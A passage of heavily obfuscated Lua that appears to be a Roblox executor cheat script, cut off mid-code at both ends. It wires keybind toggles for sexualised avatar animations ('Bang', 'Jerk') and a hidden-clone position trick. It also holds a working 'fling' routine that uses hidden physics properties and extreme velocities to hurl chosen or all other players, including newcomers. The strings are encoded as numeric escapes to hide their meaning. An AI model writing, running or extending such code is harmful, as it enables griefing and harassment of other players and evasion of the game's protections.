 , }) _IIllllIIlI:AddKeyPicker("\075\080\066\097\110\103", { Default = "\080", Text = "\066\097\110\103\032\065\110\105\109", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if not _llIIllIlll.TogBang.Value then _lIIlIllIlI.KPBang.Toggled = false return end
 if _IlIlIllIII() then return end
 _IlllllllII(_lIIlllIlII.BANG) end
 , }) do local _lIIlIIlIII = _IIlIIlllIl:AddDependencyBox() _lIIlIIlIII:AddSlider("\066\097\110\103\083\112\101\101\100", { Text = "\066\097\110\103\032\065\110\105\109\097\116\105\111\110\032\083\112\101\101\100", Default = 0x21, Min = 0x0, Max = 0x21, Rounding = 0x1, Callback = function (V) _lIIlllIlII.BANG.Speed = V if _lIIlllIlII.BANG.Track then _lIIlllIlII.BANG.Track:AdjustSpeed(V) end
 end
 }) _lIIlIIlIII:SetupDependencies({{ _IIllllIIlI, true }}) end
 local _lIIlIlIIIl = _IIlIIlllIl:AddToggle("\084\111\103\084\080\111\115\101", { Text = "\084\045\080\111\115\101", Default = false, Callback = function (_IIlIlIIlII) if not _IIlIlIIlII then if _lIIlIllIlI.KPTPose then _lIIlIllIlI.KPTPose.Toggled = false end
 if _IlIlllllll then _lIIlIIIlll() end
 end
 end
 , }) _lIIlIlIIIl:AddKeyPicker("\075\080\084\080\111\115\101", { Default = "\067", Text = "\084\045\080\111\115\101", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if not _llIIllIlll.TogTPose.Value then _lIIlIllIlI.KPTPose.Toggled = false return end
 if _IlIlIllIII() then return end
 if getgenv().FUCActive then _lIIlIllIlI.KPTPose.Toggled = _IlIlllllll return end
 if getgenv().InvisActive then getgenv()._invisSavedTPose = not (getgenv()._invisSavedTPose or false) return end
 if _lIIlIllIlI.KPTPose.Toggled == _IlIlllllll then return end
 _lIIlIIIlll() end
 , }) _IlIIlIlIIl:OnChanged( function (_IIlIlIIlII) if _IllIlllIlI.HeadFloat then return end
 if _IlIlIllIII() then _IllIlllIlI.HeadFloat = true _IlIIlIlIIl:SetValue( not _IIlIlIIlII) _IllIlllIlI.HeadFloat = false return end
 if not _IIlIlIIlII then local _llllIIIllI = _lIIlIllIlI and _lIIlIllIlI.KPHeadFloat if _llllIIIllI then _llllIIIllI.Toggled = false end
 _IIlIIlIlll() if _lIIlllIlII.L_KEY.IsActive then _IlllllllII(_lIIlllIlII.L_KEY) end
 end
 end
 ) _lIIIIlIIll:OnChanged( function (_IIlIlIIlII) if _IllIlllIlI.Jerk then return end
 if _IlIlIllIII() then _IllIlllIlI.Jerk = true _lIIIIlIIll:SetValue( not _IIlIlIIlII) _IllIlllIlI.Jerk = false return end
 if not _IIlIlIIlII then local _llllIIIllI = _lIIlIllIlI and _lIIlIllIlI.KPJerk if _llllIIIllI then _llllIIIllI.Toggled = false end
 if _lIIlllIlII.JERK.IsActive then _IlllllllII(_lIIlllIlII.JERK) end
 end
 end
 ) _IIllllIIlI:OnChanged( function (_IIlIlIIlII) if _IllIlllIlI.Bang then return end
 if _IlIlIllIII() then _IllIlllIlI.Bang = true _IIllllIIlI:SetValue( not _IIlIlIIlII) _IllIlllIlI.Bang = false return end
 if not _IIlIlIIlII then local _llllIIIllI = _lIIlIllIlI and _lIIlIllIlI.KPBang if _llllIIIllI then _llllIIIllI.Toggled = false end
 if _lIIlllIlII.BANG.IsActive then _IlllllllII(_lIIlllIlII.BANG) end
 end
 end
 ) _lIIlIlIIIl:OnChanged( function (_IIlIlIIlII) if _IllIlllIlI.TPose then return end
 if _IlIlIllIII() then _IllIlllIlI.TPose = true _lIIlIlIIIl:SetValue( not _IIlIlIIlII) _IllIlllIlI.TPose = false return end
 if getgenv().InvisActive then getgenv()._invisSavedTPose = _IIlIlIIlII return end
 if _IIlIlIIlII and getgenv().FUCActive then _IllIlllIlI.TPose = true _lIIlIlIIIl:SetValue(false) _IllIlllIlI.TPose = false return end
 if not _IIlIlIIlII and _IlIlllllll then _lIIlIIIlll() end
 end
 ) RunService.Heartbeat:Connect( function () if not getgenv().InvisActive then return end
 local _IlIIIlIlll = _lIIlllIlII.TPOSE_A local _lllIlllIII = _lIIlllIlII.F2_KEY if _IlIIIlIlll.Track and _IlIIIlIlll.Track.IsPlaying then pcall( function () _IlIIIlIlll.Track:Stop(0x0) end
 ) end
 if _lllIlllIII.Track and _lllIlllIII.Track.IsPlaying then pcall( function () _lllIlllIII.Track:Stop(0x0) end
 ) end
 if _IlIlllllll then if _IllIlllIIl then _IllIlllIIl:Disconnect() _IllIlllIIl = nil end
 _IlIlllllll = false end
 end
 ) task.spawn( function () while not _IIIllIIlll.Unloaded do task.wait(0.05) if _IIIllIIlll.Unloaded then break end
 if _lIIlllIlII.L_KEY.IsActive then local _IllIIlllIl = tick() while _lIIlllIlII.L_KEY.IsActive and tick() - _IllIIlllIl < 0x1 and not _IIIllIIlll.Unloaded do task.wait(0.05) end
 if _lIIlllIlII.L_KEY.IsActive and not _IIIllIIlll.Unloaded and _llIIllIlll.TogHeadFloat.Value then _IIIIIIlIll() end
 while _lIIlllIlII.L_KEY.IsActive and not _IIIllIIlll.Unloaded do task.wait(0.05) end
 _IIlIIlIlll() end
 end
 _IIlIIlIlll() end
 ) local function _lllIIIIlll(_lllllIIIII) if _lllllIIIII == "\077\066\049" then return _IlllIIllII:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) end
 if _lllllIIIII == "\077\066\050" then return _IlllIIllII:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) end
 local _llllllllII, result = pcall( function () return _IlllIIllII:IsKeyDown(Enum.KeyCode[_lllllIIIII]) end
 ) return _llllllllII and result or false end
 task.spawn( function () while not _IIIllIIlll.Unloaded do task.wait() if _IIIllIIlll.Unloaded then break end
 local _llllIIIllI = _lIIlIllIlI and _lIIlIllIlI.KPHeadFloat local _lllllIIIII = _llllIIIllI and _llllIIIllI.Value or "\078\111\110\101" if _lllllIIIII ~= "\078\111\110\101" and _lllIIIIlll(_lllllIIIII) and _llIIllIlll.TogHeadFloat.Value then local _IlllIIllII = tick() while _lllIIIIlll(_lllllIIIII) and _llIIllIlll.TogHeadFloat.Value and not _IIIllIIlll.Unloaded do if _IlIlIllIII() then task.wait(0.1) _lllllIIIII = (_lIIlIllIlI and _lIIlIllIlI.KPHeadFloat and _lIIlIllIlI.KPHeadFloat.Value) or "\078\111\110\101" continue end
 if tick() - _IlllIIllII > 0.3 then _IlllllllII(_lIIlllIlII.L_KEY) _lIIlIllIlI.KPHeadFloat.Toggled = _lIIlllIlII.L_KEY.IsActive task.wait(_llIlIIllII) end
 task.wait() _lllllIIIII = (_lIIlIllIlI and _lIIlIllIlI.KPHeadFloat and _lIIlIllIlI.KPHeadFloat.Value) or "\078\111\110\101" end
 end
 end
 end
 ) if _lIIIIIIllI[_llIIlIIIlI] then local _lIIlIIlIII = false _lIlIIlIlII = nil _FUCCloneRoot = nil _FUCCloneTrack = nil local _lIllIIlIII = nil local _IIlIllIlIl = 0x0 local _IllIIIlIll = nil local function _IIIllIllII(_IIllIIlllI) if _IllIIIlIll then _IllIIIlIll:Disconnect() _IllIIIlIll = nil end
 if _lIlIIlIlII then pcall( function () _lIlIIlIlII:Destroy() end
 ) _lIlIIlIlII = nil end
 _FUCCloneRoot = nil _FUCCloneTrack = nil _lIllIIlIII = nil _IIlIllIlIl = 0x0 local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIlIIIIIIl = _IIIlllIIlI and _IIIlllIIlI:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _lIlIllIlIl or not _IIIlllIIlI or not _IIlIIIIIIl then return end
 local _IIIlIIIllI = _IIllIIlllI.Archivable _IIllIIlllI.Archivable = true _lIlIIlIlII = _IIllIIlllI:Clone() _IIllIIlllI.Archivable = _IIIlIIIllI _lIlIIlIlII.Parent = workspace _FUCCloneRoot = _lIlIIlIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIllIllIIl = _lIlIIlIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIIIIIIl = _lIllIllIIl and _lIllIllIIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _FUCCloneRoot then _FUCCloneRoot.Anchored = true _FUCCloneRoot.CFrame = CFrame.new(0x5F5E100, 0x5F5E100, 0x5F5E100) end
 local _IIIIlIlIlI = Instance.new("\072\105\103\104\108\105\103\104\116", _lIlIIlIlII) _IIIIlIlIlI.FillTransparency = 0.5 _IIIIlIlIlI.OutlineTransparency = 0x0 _IIIIlIlIlI.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop _IIIIlIlIlI.FillColor = Color3.fromRGB(0x0, 0xFF, 0xFF) _IIIIlIlIlI.OutlineColor = Color3.fromRGB(0x0, 0xFF, 0xFF) _IIIIlIlIlI.Adornee = _lIlIIlIlII for _lIIlIllIlI, _lIllllllII in pairs(_lIlIIlIlII:GetDescendants()) do if _lIllllllII:IsA("\066\097\115\101\080\097\114\116") and _lIllllllII ~= _FUCCloneRoot then _lIllllllII.CollisionGroup = "\117\110\116\111\117\099\104\097\098\108\101" _lIllllllII.Massless = true _lIllllllII.CanCollide = false _lIllllllII.CanTouch = false _lIllllllII.CanQuery = false _lIllllllII.Transparency = 0.5 elseif _lIllllllII:IsA("\084\114\097\105\108") or _lIllllllII:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") then pcall( function () _lIllllllII:Destroy() end
 ) elseif _lIllllllII:IsA("\083\099\114\105\112\116") or _lIllllllII:IsA("\076\111\099\097\108\083\099\114\105\112\116") then _lIllllllII:Destroy() end
 end
 task.delay(0.1, function () if not _IIIIIIIIIl or not _lIlIIlIlII then return end
 local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\056\050\051\054\054\048\053\048\050\056" _FUCCloneTrack = _IIIIIIIIIl:LoadAnimation(_IlIllllIlI) _FUCCloneTrack.Priority = Enum.AnimationPriority.Action4 end
 ) local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\048\057\051\051\053\055\056\056\057\057\048\052\050" _lIllIIlIII = _IIlIIIIIIl:LoadAnimation(_IlIllllIlI) _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\056\050\051\054\054\048\053\048\050\056" _lIllIIlIII.Priority = Enum.AnimationPriority.Action4 _IllIIIlIll = RunService.RenderStepped:Connect( function () if not _lIlIIlIlII or not _lIlIIlIlII.Parent then return end
 _IIlIllIlIl = _IIlIllIlIl + 0x1 if _lIllIIlIII then if _lIIlIIlIII and not _lIllIIlIII.IsPlaying then _lIllIIlIII:Play() _lIllIIlIII.Looped = true elseif _lIllIIlIII.IsPlaying and ( not _lIIlIIlIII or _IIlIllIlIl % 0x3E8 == 0x0) then _lIllIIlIII:Stop() end
 _lIllIIlIII:AdjustSpeed(0x1) end
 if _FUCCloneTrack and _FUCCloneRoot then if _lIIlIIlIII then local _IlIlIllIll = _llIlIIlIll.Character local _IIIlIIIIIl = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIIIl then _FUCCloneRoot.CFrame = _IIIlIIIIIl.CFrame end
 if not _FUCCloneTrack.IsPlaying then _FUCCloneTrack:Play() _FUCCloneTrack.Looped = true end
 else _FUCCloneRoot.CFrame = CFrame.new(0x5F5E100, 0x5F5E100, 0x5F5E100) if _FUCCloneTrack.IsPlaying then _FUCCloneTrack:Stop() end
 end
 _FUCCloneTrack:AdjustSpeed(0x1) end
 end
 ) end
 if _llIlIIlIll.Character then task.spawn(_IIIllIllII, _llIlIIlIll.Character) end
 local _IlIIllIlIl = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) _lIIlIIlIII = false getgenv().FUCActive = false pcall( function () if _lIIlIllIlI.KPFUC then _lIIlIllIlI.KPFUC.Toggled = false end
 end
 ) task.wait(0x1) _IIIllIllII(_IIllIIlllI) end
 ) local _lIIlllIIll = _IIlIIlllIl:AddToggle("\084\111\103\070\085\067", { Text = "\069\110\099\114\121\112\116\101\100\032\080\111\115\105\116\105\111\110", Default = false }) _IIlIIlllIl:AddToggle("\084\111\103\072\097\110\100\079\102\102\115\101\116", { Text = "\072\097\110\100\032\079\102\102\115\101\116", Default = false, }) _lIIlllIIll:AddKeyPicker("\075\080\070\085\067", { Default = "\075", Text = "\069\110\099\114\121\112\116\101\100", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function (_lIIlIIlllI) if _IlIlllllIl.FC then return end
 if _lIIlIIlllI and not _llIIllIlll.TogFUC.Value then RunService.RenderStepped:Wait() _IlIlllllIl.FC = true; _lIIlIllIlI.KPFUC.Toggled = false; _lIIlIllIlI.KPFUC:DoClick(); _IlIlllllIl.FC = false return end
 if _llIIllIlll.TogFUC.Value and not _IlIlIllIII() then if _lIIlIllIlI.KPFUC.Toggled == _lIIlIIlIII then return end
 _lIIlIIlIII = not _lIIlIIlIII; getgenv().FUCActive = _lIIlIIlIII if _lIIlIIlIII then _IlIlIIIlIl(false, true) else _IlIllIlIlI(false) end
 end
 end
 , }) _lIIlllIIll:OnChanged( function (_IIlIlIIlII) if _IllIlllIlI.FUC then return end
 if _IlIlIllIII() then _IllIlllIlI.FUC = true _lIIlllIIll:SetValue( not _IIlIlIIlII) _IllIlllIlI.FUC = false return end
 if not _IIlIlIIlII and _lIIlIIlIII then if _lIIlIllIlI.KPFUC then _lIIlIllIlI.KPFUC.Toggled = false end
 _lIIlIIlIII = false getgenv().FUCActive = false _IlIllIlIlI(false) end
 end
 ) table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.TogHeadFloat:SetValue(false) end
 ) pcall( function () _llIIllIlll.TogJerk:SetValue(false) end
 ) pcall( function () _llIIllIlll.TogBang:SetValue(false) end
 ) pcall( function () _llIIllIlll.TogTPose:SetValue(false) end
 ) end
 ) table.insert(_IllIllIIll, function () if _lIIlIIlIII then _lIIlIIlIII = false getgenv().FUCActive = false pcall( function () _llIIllIlll.TogFUC:SetValue(false) end
 ) end
 if _lIlIIlIlII then pcall( function () _lIlIIlIlII:Destroy() end
 ) _lIlIIlIlII = nil end
 _FUCCloneRoot = nil _FUCCloneTrack = nil _lIllIIlIII = nil end
 ) end
 local function _lllIIllIll(_IlIlIIIlII) local _IIllIIlllI = _IlIlIIIlII.Character if not _IIllIIlllI then return false end
 local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lIlIllIlIl then return false end
 local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IIIlllIIlI or _IIIlllIIlI.Health <= 0x0 then return false end
 local _IlIIlIIIll = _lIlIllIlIl.Position local _IlIllIIIIl = getgenv().FPDH or workspace.FallenPartsDestroyHeight if _IlIIlIIIll.Y <= _IlIllIIIIl + 0x64 then return false end
 if math.abs(_IlIIlIIIll.X) > 0x2710 or math.abs(_IlIIlIIIll.Z) > 0x2710 then return false end
 return true end
 local function _IlIlIllIII(_IlIlIIIlII) local _IIllIIlllI = _IlIlIIIlII and _IlIlIIIlII.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") return _lIlIllIlIl and _lIlIllIlIl.Velocity.Magnitude >= 0x7D0 or false end
 local function _llllIIlIll(TargetPlayer) if not TargetPlayer or not TargetPlayer.Parent then return end
 local _lIIllIIIII = _llIlIIlIll.Character local _lIlIlIIlII = _lIIllIIIII and _lIIllIIIII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lIIllIlIII = _lIlIlIIlII and _lIlIlIIlII.RootPart local _llIllIlIIl = TargetPlayer.Character if not _llIllIlIIl then return end
 local _IlIIllIlIl = _llIllIlIIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _llIIIlIIII = _IlIIllIlIl and _IlIIllIlIl.RootPart local _lIIIIlIIlI = _llIllIlIIl:FindFirstChild("\072\101\097\100") local _lIIIIllllI = _llIllIlIIl:FindFirstChildOfClass("\065\099\099\101\115\115\111\114\121") local _IlIlIllIlI = _lIIIIllllI and _lIIIIllllI:FindFirstChild("\072\097\110\100\108\101") if not (_lIIllIIIII and _lIlIlIIlII and _lIIllIlIII) then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\070\108\105\110\103"), Content = "\089\111\117\114\032\099\104\097\114\097\099\116\101\114\032\105\115\032\110\111\116\032\114\101\097\100\121\046", _IlllIlIllI = 0x4 }) return end
 if _IlIIllIlIl and _IlIIllIlIl.Sit then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\070\108\105\110\103"), Content = TargetPlayer.Name .. "\032\105\115\032\099\117\114\114\101\110\116\108\121\032\115\101\097\116\101\100\046", _IlllIlIllI = 0x4 }) return end
 if not _llIllIlIIl:FindFirstChildWhichIsA("\066\097\115\101\080\097\114\116") then return end
 if _lIIllIlIII.Velocity.Magnitude < 0x32 then getgenv().OldPos = _lIIllIlIII.CFrame end
 if _lIIIIlIIlI then pcall( function () workspace.CurrentCamera.CameraSubject = _lIIIIlIIlI end
 ) elseif _IlIlIllIlI then pcall( function () workspace.CurrentCamera.CameraSubject = _IlIlIllIlI end
 ) elseif _IlIIllIlIl then pcall( function () workspace.CurrentCamera.CameraSubject = _IlIIllIlIl end
 ) end
 local _IIIIllIllI = _lIIlIllIlI.CmdFlingMethod and _lIIlIllIlI.CmdFlingMethod.Value or "\086\111\105\100" local _lIlIIllllI = _lIIlIllIlI.FlingSpeed and _lIIlIllIlI.FlingSpeed.Value or 0xF local _IIlIlllIII = _IIIIllIllI == "\065\110\116\105\045\070\108\105\110\103" and -0.75 or (_IIIIllIllI == "\078\111\114\109\097\108" and 0x0 or 0x1) local _lllIllllll = _IlllIlIlII local _lllIIIlIIl = 0x0 local function _IIIlIIIIII(bp) return bp and bp.Parent ~= nil end
 local function _llIlIIlIII(basePart) if not _lllIllllll then return end
 pcall( function () sethiddenproperty(_lIIllIlIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lIIllIlIII.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lIIllIlIII.AssemblyAngularVelocity = Vector3.zero end
 ) if basePart and basePart.Parent then pcall( function () sethiddenproperty(basePart, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () basePart.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () basePart.AssemblyAngularVelocity = Vector3.zero end
 ) end
 end
 local _llIIlIIlII = function (BasePart) if not _IIIlIIIIII(BasePart) then return end
 local _IlIIlIIIll = BasePart.Position local _llIIIlIlll = 0x0 pcall( function () _llIIIlIlll = BasePart.Velocity.Magnitude end
 ) _lllIIIlIIl = _lllIIIlIIl + _lIlIIllllI local _IIIIIIlIIl = CFrame.new(0x0, _IIlIlllIII, 0x0) * CFrame.Angles(math.rad(0x5A), 0x0, math.rad(_lllIIIlIIl)) local _IIllIllIIl = _IlIIllIlIl and _IlIIllIlIl.MoveDirection or Vector3.zero pcall( function () if _lllIllllll then local _llllIIIIII = CFrame.new(_IlIIlIIIll) * _IIIIIIlIIl sethiddenproperty(_lIIllIlIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", BasePart) sethiddenproperty(BasePart, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lIIllIlIII) _lIIllIlIII.CFrame = _llllIIIIII else local _llllIIIIII = CFrame.new(_IlIIlIIIll) * _IIIIIIlIIl + _IIllIllIIl * (_llIIIlIlll / 1.25) _lIIllIlIII.CFrame = _llllIIIIII _lIIllIIIII:SetPrimaryPartCFrame(_llllIIIIII) end
 _lIIllIlIII.Velocity = Vector3.new(0x0, -9e9, 0x0) _lIIllIlIII.RotVelocity = Vector3.new(9e8, 9e8, 9e8) end
 ) end
 local _IIIlIIlIII = function (BasePart) local _IlllIlIllI = tick() local _IlIlIIIlIl = _lIIlIllIlI.FlingTimeout and _lIIlIllIlI.FlingTimeout.Value or 0x3 pcall( function () _IlIIllIlIl.PlatformStand = true end
 ) repeat if not _IIIlIIIIII(BasePart) then break end
 if not _IlIIllIlIl or not _IlIIllIlIl.Parent then break end
 _llIIlIIlII(BasePart) task.wait() until _IlllIlIllI + _IlIlIIIlIl < tick() or not _llllIlllll or not _IIIlIIIIII(BasePart) pcall( function () _IlIIllIlIl.PlatformStand = false end
 ) pcall( function () _IlIIllIlIl:ChangeState(Enum.HumanoidStateType.GettingUp) end
 ) _llIlIIlIII(BasePart) end
 workspace.FallenPartsDestroyHeight = 0x0/0x0 local _lIlIIIIIII = Instance.new("\066\111\100\121\086\101\108\111\099\105\116\121") _lIlIIIIIII.Parent = _lIIllIlIII _lIlIIIIIII.Velocity = Vector3.new(0x0, -9e12, 0x0) _lIlIIIIIII.MaxForce = Vector3.new(0x0, -9e12, 0x0) _lIlIlIIlII:SetStateEnabled(Enum.HumanoidStateType.Seated, false) if _llIIIlIIII and _IIIlIIIIII(_llIIIlIIII) then pcall(_IIIlIIlIII, _llIIIlIIII) elseif _lIIIIlIIlI and _IIIlIIIIII(_lIIIIlIIlI) then pcall(_IIIlIIlIII, _lIIIIlIIlI) elseif _IlIlIllIlI and _IIIlIIIIII(_IlIlIllIlI) then pcall(_IIIlIIlIII, _IlIlIllIlI) else _IIIllIIlll:Notify({ Title = _IlIIIlllII("\070\108\105\110\103"), Content = TargetPlayer.Name .. "\032\104\097\115\032\110\111\032\118\097\108\105\100\032\112\097\114\116\115\032\116\111\032\116\097\114\103\101\116\046", _IlllIlIllI = 0x4 }) _lIlIIIIIII:Destroy() _lIlIlIIlII:SetStateEnabled(Enum.HumanoidStateType.Seated, true) return end
 pcall( function () _lIlIIIIIII:Destroy() end
 ) pcall( function () _lIlIlIIlII:SetStateEnabled(Enum.HumanoidStateType.Seated, true) end
 ) pcall( function () _lIIllIlIII.Velocity = Vector3.new() end
 ) pcall( function () _lIIllIlIII.RotVelocity = Vector3.new() end
 ) pcall( function () workspace.CurrentCamera.CameraSubject = _lIlIlIIlII end
 ) if getgenv().OldPos then local _IlllIIlllI = tick() repeat pcall( function () _lIIllIlIII.CFrame = getgenv().OldPos * CFrame.new(0x0, .0x5, 0x0) _lIIllIIIII:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0x0, .0x5, 0x0)) _lIlIlIIlII:ChangeState("\071\101\116\116\105\110\103\085\112") for _lIIlIllIlI, _IllllllIIl in pairs(_lIIllIIIII:GetChildren()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") then _IllllllIIl.Velocity = Vector3.new() _IllllllIIl.RotVelocity = Vector3.new() end
 end
 end
 ) task.wait() until (_lIIllIlIII.Position - getgenv().OldPos.p).Magnitude < 0x19 or tick() - _IlllIIlllI > 0x3 pcall( function () _lIIllIlIII.Velocity = Vector3.new() end
 ) pcall( function () _lIIllIlIII.RotVelocity = Vector3.new() end
 ) end
 end
 _IIlIllIlII = function () end
 local function _lIIlIlIllI() if not _IlIlllIIll then return end
 local _IIIllIlIll = _lIlllIIIII() flingPlayerCache = _IIIllIlIll local _lIIlllllll = {} for _lIIIIllIIl, _lIIlIllIlI in pairs(_IlIlIlIIll) do _lIIlllllll[_lIIIIllIIl] = true end
 pcall( function () _IlIlllIIll:SetValues(_IIIllIlIll) _IlIlllIIll:SetValue(_lIIlllllll) end
 ) end
 local _IlIIIlIIIl = Players.PlayerAdded:Connect( function (joinedPlayer) task.wait(0.5) pcall(_lIIlIlIllI) if _llllIlllll and (_lIllIllIIl == "\097\108\108" or _lIllIllIIl == "\111\116\104\101\114\115") and joinedPlayer ~= _llIlIIlIll then task.spawn( function () task.wait(0x1) if _llllIlllll and (_lIllIllIIl == "\097\108\108" or _lIllIllIIl == "\111\116\104\101\114\115") and _lllIIllIll(joinedPlayer) then _IlIlIlIIll[_IIIllIIlII(joinedPlayer)] = joinedPlayer pcall(_lIIlIlIllI) end
 end
 ) end
 end
 ) local _IIlIIIIlll = Players.PlayerRemoving:Connect( function () task.wait(0.1) pcall(_lIIlIlIllI) end
 ) local function _lIlIIIlIIl(select) _IlIlIlIIll = {} if select then for _lIIlIllIlI, _lIIIIllIIl in ipairs(flingPlayerCache) do local _IlIlIIIlII = _IIllllIllI(_lIIIIllIIl) if _IlIlIIIlII then _IlIlIlIIll[_lIIIIllIIl] = _IlIlIIIlII end
 end
 end
 if _IlIlllIIll then local _IIllIlIIIl = {} for _lIIIIllIIl, _lIIlIllIlI in pairs(_IlIlIlIIll) do _IIllIlIIIl[_lIIIIllIIl] = true end
 pcall( function () _IlIlllIIll:SetValue(_IIllIlIIIl) end
 ) end
 end
 local function _IlIllIIlIl() local _lllllIIlII = 0x0 for _lIIlIllIlI in pairs(_IlIlIlIIll) do _lllllIIlII = _lllllIIlII + 0x1 end
 return _lllllIIlII end
 local function _IIlIlllllI() if _llllIlllll then return end
 if _IlIllIIlIl() == 0x0 then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\070\108\105\110\103"), Content = "\078\111\032\116\097\114\103\101\116\115\032\115\101\108\101\099\116\101\100\046", _IlllIlIllI = 0x4 }) return end
 _llllIlllll = true if _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") then _IlIlIIlllI = _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100").Died:Connect( function () if _llllIlllll then _llllIlllll = false _IIIIllIIlI() if _IlIlIIlllI then _IlIlIIlllI:Disconnect() _IlIlIIlllI = nil end
 end
 end
 ) end
 task.spawn( function () local _lIIIllIIll = Players.PlayerRemoving:Connect( function (removedPlayer) local _IlllIlIlll = _IIIllIIlII(removedPlayer) if _IlIlIlIIll[_IlllIlIlll] then _IlIlIlIIll[_IlllIlIlll] = nil pcall( function () local _IllIIIlllI = workspace.CurrentCamera.CameraSubject if _IllIIIlllI and removedPlayer.Character and _IllIIIlllI:IsDescendantOf(removedPlayer.Character) then _llIIIIIlll() _IllllIlIlI = false pcall( function () workspace.CurrentCamera.CameraSubject = _llIlIIlIll.Character end
 ) end
 end
 ) if next(_IlIlIlIIll) == nil then _llllIlllll = false end
 end
 end
 ) local _lllIIlIIll = nil local _IllllIIlII = {} local _lIlIllIIIl = 0x0 local function _llllllIIll() local _llIIlIllII = {} for _lIIlIllIlI, _IllIIlllIl in ipairs(_IllllIIlII) do _llIIlIllII[_IllIIlllIl] = true end
 for _lIIIIllIIl, _lIIlIllIlI in pairs(_IlIlIlIIll) do if not _llIIlIllII[_lIIIIllIIl] then table.insert(_IllllIIlII, _lIIIIllIIl) end
 end
 for _IIllIllIll = #_IllllIIlII, 0x1, -0x1 do if not _IlIlIlIIll[_IllllIIlII[_IIllIllIll]] then table.remove(_IllllIIlII, _IIllIllIll) if _lIlIllIIIl >= _IIllIllIll then _lIlIllIIIl = math.max(0x0, _lIlIllIIIl - 0x1) end
 end
 end
 end
 local function _IllIlllIll() _IllllIIlII = {} _lIlIllIIIl = 0x0 end
 local function _IlllIllIII(_IIlIIIIIIl) _llllllIIll() local _IIlIlllIIl = #_IllllIIlII if _IIlIlllIIl == 0x0 then return nil end
 for _IllllIlIlI = 0x1, _IIlIlllIIl do local _IIIllIIIIl = (_lIlIllIIIl + _IllllIlIlI - 0x1) % _IIlIlllIIl + 0x1 local _lIIIIllIIl = _IllllIIlII[_IIIllIIIIl] local _lIIlIIlllI = _IIlIIIIIIl[_lIIIIllIIl] if _lIIlIIlllI and _lllIIllIll(_lIIlIIlllI) and not _IlIlIllIII(_lIIlIIlllI) then _lIlIllIIIl = _IIIllIIIIl return _lIIlIIlllI end
 end
 return nil end
 while _llllIlllll do local _IIlIIIIIIl = {} for _lIIIIllIIl, _IlIlIIIlII in pairs(_IlIlIlIIll) do if _IlIlIIIlII and _IlIlIIIlII.Parent then _IIlIIIIIIl[_lIIIIllIIl] = _IlIlIIIlII else _IlIlIlIIll[_lIIIIllIIl] = nil end
 end
 local _lIlIlIlIIl = _IlllIllIII(_IIlIIIIIIl) if next(_IIlIIIIIIl) == nil then if _IllllIlIlI and not _IIIllIIlll then _IIIIllIIlI() _IllllIlIlI = false _lllIIlIIll = nil end
 _llllIlllll = false break elseif not _lIlIlIlIIl then if _IllllIlIlI and not _IIIllIIlll then _IIIIllIIlI() _IllllIlIlI = false _lllIIlIIll = nil end
 task.wait(0.2) else local _IlIlIIIlII = _lIlIlIlIIl if not _IIIllIIlll and _lllIIlIIll ~= _IlIlIIIlII then _IIIIIlllll(_IlIlIIIlII) _IllllIlIlI = true _lllIIlIIll = _IlIlIIIlII end
 if not _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] then _IlIlIlllll() end
 local _llllllllII, err = pcall(_llllIIlIll, _IlIlIIIlII) if not _llllllllII then warn("\091\082\101\118\101\110\097\110\116\032\070\108\105\110\103\093\032\080\104\097\110\116\097\070\108\105\110\103\032\101\114\114\111\114\058\032" .. tostring(err)) end
 if not _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] then _lIIIlIlIlI() end
 if _lIllIllIIl == nil then local _lIIlIIllIl = _IIIllIIlII(_IlIlIIIlII) _IlIlIlIIll[_lIIlIIllIl] = nil end
